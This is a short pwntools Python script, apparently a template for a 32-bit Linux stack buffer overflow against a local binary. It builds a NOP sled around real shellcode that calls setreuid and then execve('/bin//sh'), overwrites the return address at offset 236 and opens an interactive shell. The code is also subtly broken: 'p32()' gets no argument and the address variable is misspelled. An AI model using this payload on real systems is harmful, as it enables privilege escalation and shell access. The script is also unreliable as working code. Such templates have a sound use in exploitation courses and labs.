from pwn import *

#Update the Context with the Architecture and OS
context.update(arch="i386", os="linux")

#Create a Process Object to talk to. This should be our Target Binary
p = process("./a.out")

# Do an initial read to get the welcome message
data = p.read()
print(data)  #For Debugging

raw_input("Attach GDB and press enter")  #More debugging


# And add our Shellcode

shellcode ="".join(["\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46",
                   "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68",
                   "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"])


# Offset to EIP (You need to calculate this)
OFFSET = 236

#Address we want to jump to (You need to supply this)
#Pwntools will automatically convert to the correct endianness
TARGET_ADRESS = p32()


#Now we will build our payload

payloadLen = OFFSET - len(shellcode) #How many 'A's to Pad with
payloadLen = payloadLen - 20 #I like a bit of space below the shellcode too

payload = "\x90"*payloadLen  #Write NOPS
payload += shellcode  #Add Shellcode
payload += "\x90"*20  #More Nops
payload += TARGET_ADDRESS #Address to Jump to

p.writeline(payload)  #Write it to the Binary
p.interactive() #Go into interactive mode.




